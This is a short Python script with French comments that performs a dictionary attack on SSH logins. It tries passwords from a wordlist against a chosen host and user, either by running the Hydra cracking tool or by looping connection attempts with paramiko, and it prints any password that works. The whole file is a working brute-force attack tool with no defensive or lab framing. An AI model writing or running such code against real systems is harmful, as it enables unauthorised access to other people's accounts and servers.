import paramiko
import subprocess

# Attaque par dictionnaire SSH

def brute_force_dictionnaire(target, username, wordlist, use_hydra=False, port=22):
    if use_hydra:
        print(f"Brute force dictionnaire sur {target}:{port} avec Hydra pour l'utilisateur {username} et wordlist {wordlist}")
        try:
            cmd = [
                "hydra", "-l", username, "-P", wordlist, target, "ssh", "-s", str(port)
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            print(result.stdout)
            if "login:" in result.stdout:
                print("Mot de passe trouvé !")
            else:
                print("Aucun mot de passe valide trouvé.")
        except Exception as e:
            print(f"Erreur lors de l'exécution d'Hydra : {e}")
    else:
        print(f"Brute force dictionnaire sur {target}:{port} avec paramiko pour l'utilisateur {username} et wordlist {wordlist}")
        try:
            with open(wordlist, 'r') as f:
                for password in f:
                    password = password.strip()
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(target, port=port, username=username, password=password, timeout=2)
                        print(f"Mot de passe trouvé: {password}")
                        ssh.close()
                        return
                    except paramiko.AuthenticationException:
                        print(f"Echec avec: {password}")
                    except Exception as e:
                        print(f"Erreur: {e}")
            print("Mot de passe non trouvé dans le dictionnaire.")
        except Exception as e:
            print(f"Erreur d'ouverture du fichier: {e}")
